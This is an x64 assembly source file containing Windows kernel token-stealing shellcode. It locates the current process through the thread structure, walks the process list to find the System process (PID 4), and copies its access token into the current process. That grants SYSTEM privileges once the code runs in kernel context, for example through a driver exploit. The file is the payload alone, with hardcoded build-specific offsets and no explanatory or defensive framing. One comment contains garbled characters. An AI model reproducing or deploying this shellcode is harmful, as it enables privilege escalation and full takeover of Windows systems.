.code
shellcode proc

	; shellcode±‡–¥
	mov rax, gs:[188h]	;Kprcb.Kpthread
	mov rax, [rax+220h]	;process
	mov	rcx, rax	; keep copy value
	mov	rdx, 4		; system PID

findSystemPid:
	mov	rax, [rax+2e8h]	; ActiveProcessLinks : _LIST_ENTRY
	sub	rax, 2e8h
	cmp	[rax+2e0h], rdx
	jnz findSystemPid 

	mov rdx, [rax+358h]	; get system token
	mov [rcx+358h], rdx	; copy
	ret
	db 0
	db 0
	db 0
shellcode endp
end